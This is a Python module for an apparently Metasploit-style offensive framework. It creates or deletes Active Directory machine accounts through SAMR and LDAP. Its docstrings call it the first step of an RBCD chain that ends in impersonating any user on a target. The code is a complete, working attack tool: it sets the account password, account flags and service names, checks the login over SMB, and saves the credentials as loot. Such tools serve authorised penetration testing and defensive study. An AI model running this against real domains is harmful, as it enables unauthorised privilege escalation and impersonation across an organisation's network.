"""Create (or delete) a domain machine account — the RBCD setup step.

Every domain user may create machine accounts up to
ms-DS-MachineAccountQuota (default 10) — it's the rare AD feature that
hands regular users a writable principal. The attack flow:

  add_computer -> rbcd set (on a target you control) -> s4u (with the
  machine's password) -> impersonate anyone to the target

Implementation: SAMR create (SamrCreateUser2InDomain), then LDAP for
password (unicodePwd, UTF-16-LE quoted), UAC, and SPNs. On Samba the
account lands in CN=Users with the user class (no dNSHostName —
objectClass violation, cosmetic and skipped); on Windows it lands in
CN=Computers as a proper computer. Auth is verified with a real SMB
session setup before reporting success.
"""

import random
import string

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptString

try:
    from impacket.dcerpc.v5 import samr, transport
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from impacket.smbconnection import SMBConnection
except ImportError:
    samr = None  # console gates run() on requirements

PASSWORD_ALPHABET = string.ascii_letters + string.digits + "!#$%"


def rand_machine_name():
    return "FZ" + "".join(random.choice(string.ascii_uppercase)
                          for _ in range(6)) + "$"


def rand_password(length=16):
    """Complexity-proof machine password. AD/Samba require 3 of 4
    character classes (upper, lower, digit, symbol) — a uniform draw
    from the alphabet misses often enough to flake (~6% at length 16),
    so seed one char from every class and shuffle."""
    pools = (string.ascii_uppercase, string.ascii_lowercase,
             string.digits, "!#$%")
    chars = [random.choice(pool) for pool in pools]
    chars += [random.choice(PASSWORD_ALPHABET)
              for _ in range(max(0, length - len(chars)))]
    random.shuffle(chars)
    return "".join(chars)


class AddComputer(AuxiliaryModule):
    name = "Add Machine Account (SAMR + LDAP)"
    description = """
        Creates a domain machine account with a known password (SAMR
        create, LDAP unicodePwd/UAC/SPN), verified by a real SMB auth.
        Any domain user can do this up to MachineAccountQuota — it's the
        first half of the RBCD chain (rbcd set, then s4u). DELETE=true
        removes the account instead. Credentials land in the store.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Any domain user"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))
        self.options.add(OptString("COMPUTER_NAME", default="",
                                   description="Machine name (blank = random FZxxxx$)"))
        self.options.add(OptString("COMPUTER_PASSWORD", default="",
                                   description="Machine password (blank = random)"))
        self.options.add(OptBool("DELETE", default=False,
                                 description="Delete the account instead"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        name = str(self.get_option("COMPUTER_NAME") or "").strip() \
            or rand_machine_name()
        machine_pw = str(self.get_option("COMPUTER_PASSWORD") or "") \
            or rand_password()
        if not name.endswith("$"):
            name += "$"

        try:
            dce, domain_handle, domain_sid = self._samr_open(
                host, domain, user, password)
        except Exception as e:
            self.print_error(f"{host}: SAMR open failed - {e}")
            return

        if self.get_option("DELETE"):
            self._delete(dce, domain_handle, domain, name, host)
            dce.disconnect()
            return

        try:
            resp = samr.hSamrCreateUser2InDomain(
                dce, domain_handle, name, samr.USER_NORMAL_ACCOUNT,
                samr.USER_FORCE_PASSWORD_CHANGE)
        except Exception as e:
            self.print_error(f"{host}: create failed (quota? permissions?) "
                             f"- {e}")
            dce.disconnect()
            return
        user_handle = resp["UserHandle"]
        rid = resp["RelativeId"]
        samr.hSamrCloseHandle(dce, user_handle)
        dce.disconnect()
        machine_sid = f"{domain_sid.formatCanonical()}-{rid}"
        self.print_good(f"{host}: created {name} (rid {rid})")

        dn = self._configure(host, domain, user, password, name, machine_pw)
        if dn is None:
            return
        try:
            conn = SMBConnection(host, host, timeout=10)
            conn.login(name, machine_pw, domain)
            conn.close()
        except Exception as e:
            self.print_error(f"{host}: machine auth verification failed - {e}")
            return
        self.print_good(f"{host}: {name} authenticates — password works")
        self.print_status(f"  {name} / {machine_pw}")
        self.print_status(f"  sid: {machine_sid}")

        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_cred(host, "smb", name, machine_pw,
                           source="add_computer")
            store.add_loot("machine-account", f"{name} @ {domain}",
                           f"sid={machine_sid}\n"
                           f"dn={dn}\n"
                           f"password={machine_pw}", address=host)

    def _samr_open(self, host, domain, user, password):
        rpc = transport.DCERPCTransportFactory(f"ncacn_np:{host}[\\pipe\\samr]")
        rpc.set_credentials(user, password, domain)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(dce)
        server_handle = resp["ServerHandle"]
        resp = samr.hSamrLookupDomainInSamServer(
            dce, server_handle, domain.split(".")[0])
        domain_sid = resp["DomainId"]
        resp = samr.hSamrOpenDomain(dce, serverHandle=server_handle,
                                    domainId=domain_sid)
        return dce, resp["DomainHandle"], domain_sid

    def _configure(self, host, domain, user, password, name, machine_pw):
        try:
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind failed - {e}")
            return None
        dn = None
        for packet in conn.search(searchBase=",".join(
                f"DC={p}" for p in domain.split(".")),
                searchFilter=f"(sAMAccountName={name})",
                attributes=["objectClass"]):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                dn = str(packet["objectName"])
        if dn is None:
            self.print_error(f"{host}: created account not found in LDAP?!")
            return None
        fqdn = f"{name.rstrip('$').lower()}.{domain}"
        spns = [f"HOST/{name.rstrip('$')}", f"HOST/{fqdn}"]
        ops = [
            ("unicodePwd", impacket_ldap.MODIFY_REPLACE,
             [f'"{machine_pw}"'.encode("utf-16-le")]),
            ("userAccountControl", impacket_ldap.MODIFY_REPLACE, ["4096"]),
            ("servicePrincipalName", impacket_ldap.MODIFY_REPLACE, spns),
        ]
        for attr, op, vals in ops:
            try:
                conn.modify(dn, {attr: [(op, vals)]})
                self.print_debug(f"{host}: {attr} set")
            except Exception as e:
                self.print_error(f"{host}: setting {attr} failed - {e}")
        # dNSHostName only exists on computer-class entries (Windows);
        # Samba's SAMR creates user-class, where it's a violation
        try:
            conn.modify(dn, {"dNSHostName":
                             [(impacket_ldap.MODIFY_REPLACE, [fqdn])]})
        except Exception as e:
            self.print_debug(f"{host}: dNSHostName skipped ({e})")
        return dn

    def _delete(self, dce, domain_handle, domain, name, host):
        try:
            resp = samr.hSamrLookupNamesInDomain(dce, domain_handle, (name,))
            rid = resp["RelativeIds"]["Element"][0]
            resp = samr.hSamrOpenUser(dce, domain_handle,
                                      samr.DELETE, rid)
            user_handle = resp["UserHandle"]
            samr.hSamrDeleteUser(dce, user_handle)
            self.print_good(f"{host}: {name} deleted")
        except Exception as e:
            self.print_error(f"{host}: delete failed - {e}")
